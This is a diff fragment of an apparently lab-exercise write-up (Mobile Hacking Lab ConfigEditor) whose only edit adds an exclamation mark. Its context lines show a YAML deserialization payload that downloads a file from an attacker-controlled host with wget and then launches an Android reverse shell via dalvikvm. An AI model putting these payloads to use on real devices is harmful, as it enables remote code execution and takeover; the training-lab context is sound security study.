@@ -168,7 +168,7 @@ stage1: !!com.mobilehackinglab.configeditor.LegacyCommandUtil [ "wget $IP:8081/r
 stage2: !!com.mobilehackinglab.configeditor.LegacyCommandUtil [ "/system/bin/dalvikvm -cp /data/data/com.mobilehackinglab.configeditor/reverse.jar AndroidReverseShell" ]
 ```
 
-Let's go
+Let's go!
 
 ```sh
 # Start a Python HTTP server to host the shell.yaml and reverse.jar files in  folder
